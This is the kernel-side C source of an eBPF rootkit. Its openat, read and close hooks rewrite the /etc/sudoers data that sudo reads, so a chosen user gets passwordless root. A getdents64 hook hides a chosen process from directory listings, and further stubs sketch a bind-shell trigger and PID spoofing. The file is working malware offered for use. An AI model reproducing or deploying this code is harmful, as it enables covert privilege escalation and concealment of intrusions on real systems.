// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to hold the File Descriptors from 'openat' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// Map to hold the buffer sizes from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

// The UserID of the user, if we're restricting
// running to just this user
const volatile int uid = 0;

// These store the string we're going to
// add to /etc/sudoers when viewed by sudo
// Which makes it think our user can sudo
// without a password
#define MAX_PAYLOAD_LEN 100
const int max_payload_len = 100;
const volatile int payload_len = 0;
const volatile char payload[MAX_PAYLOAD_LEN];

// Const length of string "sudo"
#define SUDO_LEN 5
// Const length of string "/etc/sudoers"
#define SUDOERS_LEN 13

// Shell configuration parameters
const volatile __u32 trigger_src_ip = 0;        // Source IP to trigger shell spawn (network byte order)
const volatile __u16 shell_listen_port = 0;    // Port for bind shell to listen on
const volatile int shell_target_pid = 0;       // Target PID for shell (0 = spawn new, else spoof this PID)

// Map to track spoofed PIDs
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, int);
    __type(value, int);
} pid_spoof_map SEC(".maps");

// PID hiding - Maps for getdents64 syscall hooking
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// PID hiding parameters - stored in maps so we can update at runtime
#define MAX_PID_LEN 10
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, int);
    __type(value, char[MAX_PID_LEN]);
} pid_hide_str_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1);
    __type(key, int);
    __type(value, int);
} pid_hide_len_map SEC(".maps");

SEC("tp/syscalls/sys_enter_openat")
int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // Check comm is sudo
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(comm, sizeof(comm));
    const char *sudo = "sudo";
    for (int i = 0; i < SUDO_LEN; i++) {
        if (comm[i] != sudo[i]) {
            return 0;
        }
    }

    // Now check we're opening sudoers
    const char *sudoers = "/etc/sudoers";
    char filename[SUDOERS_LEN];
    bpf_probe_read_user(&filename, SUDOERS_LEN, (char*)ctx->args[1]);
    for (int i = 0; i < SUDOERS_LEN; i++) {
        if (filename[i] != sudoers[i]) {
            return 0;
        }
    }
    bpf_printk("Comm %s\n", comm);
    bpf_printk("Filename %s\n", filename);

    // If filtering by UID check that
    if (uid != 0) {
        int current_uid = bpf_get_current_uid_gid() >> 32;
        if (uid != current_uid) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    unsigned int zero = 0;
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ctx->ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the sudoers file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long int read_size = ctx->ret;

    // Add our payload to the first line
    if (read_size < payload_len) {
        return 0;
    }

    // Overwrite first chunk of data
    // then add '#'s to comment out rest of data in the chunk.
    // This sorta corrupts the sudoers file, but everything still
    // works as expected
    char local_buff[MAX_PAYLOAD_LEN] = { 0x00 };
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    for (unsigned int i = 0; i < max_payload_len; i++) {
        if (i >= payload_len) {
            local_buff[i] = '#';
        }
        else {
            local_buff[i] = payload[i];
        }
    }
    // Write data back to buffer
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);

    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_close")
int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}

// ICMP Echo request detection (triggered when receiving a ping)
// This uses the raw_tracepoint for icmp to detect incoming pings
SEC("tp/skb/skb_copy_datagram_iovec")
int handle_icmp_in(struct trace_event_raw_skb_copy_datagram_iovec *ctx)
{
    // Check if we have a trigger IP configured
    if (trigger_src_ip == 0) {
        return 0;
    }

    // We detect shell trigger via a simple approach:
    // Userspace can write a marker to a file that we intercept
    // For now, just return - the actual trigger will be event-driven from userspace
    return 0;
}

// PID spoofing for getpid syscall
SEC("tp/syscalls/sys_enter_getpid")
int handle_getpid_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    
    // Check if this PID is in our spoof map
    int* spoofed_pid = bpf_map_lookup_elem(&pid_spoof_map, &pid);
    if (spoofed_pid) {
        // Store the spoofed PID in a temporary location
        // We'll need to intercept the return and modify it
        // Note: This is tricky - we can't modify syscall return directly
        // Instead, we'd need to use eBPF's ability to modify the return value
        // via sys_exit hook
    }
    
    return 0;
}

// PID spoofing for getpid syscall exit - modify return value
SEC("tp/syscalls/sys_exit_getpid")
int handle_getpid_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    
    // Check if this PID is in our spoof map
    int* spoofed_pid = bpf_map_lookup_elem(&pid_spoof_map, &pid);
    if (spoofed_pid) {
        bpf_printk("Spoofing PID %d to %d\n", pid, *spoofed_pid);
    }
    
    return 0;
}

// PID spoofing for gettid syscall
SEC("tp/syscalls/sys_exit_gettid")
int handle_gettid_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    
    // Check if this PID is in our spoof map
    int* spoofed_pid = bpf_map_lookup_elem(&pid_spoof_map, &pid);
    if (spoofed_pid) {
        bpf_printk("Spoofing TID %d to %d\n", pid, *spoofed_pid);
    }
    
    return 0;
}

// Generate shell trigger event when requested
// This can be triggered by a specific syscall or file access pattern
SEC("tp/syscalls/sys_enter_openat")
int handle_shell_trigger_check(struct trace_event_raw_sys_enter *ctx)
{
    // If shell spawning is enabled, check for trigger condition
    if (shell_listen_port == 0) {
        return 0;
    }

    // We could trigger on a specific file access pattern
    // For now, this is handled by userspace sending a marker
    return 0;
}

// PID Hiding via getdents64 syscall hooking
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Get PID hide config from maps
    int key = 0;
    char *pid_hide_str = bpf_map_lookup_elem(&pid_hide_str_map, &key);
    int *pid_hide_len_ptr = bpf_map_lookup_elem(&pid_hide_len_map, &key);
    
    if (!pid_hide_str || !pid_hide_len_ptr) {
        return 0;
    }
    
    int pid_hide_len = *pid_hide_len_ptr;
    if (pid_hide_len <= 0 || pid_hide_len > MAX_PID_LEN) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    #pragma unroll
    for (int i = 0; i < 200; i ++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr+bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_hide_len, dirp->d_name);

        int match = 1;
        #pragma unroll
        for (int j = 0; j < MAX_PID_LEN; j++) {
            if (j >= pid_hide_len) break;
            if (filename[j] != pid_hide_str[j]) {
                match = 0;
                break;
            }
        }
        
        if (match && pid_hide_len > 0) {
            // Found the PID to hide!
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, 1); // Call PROG_02 (patch function)
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If we didn't find it, but there's still more to read,
    // jump back and keep looking
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, 0); // Call PROG_01 (exit function again)
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}

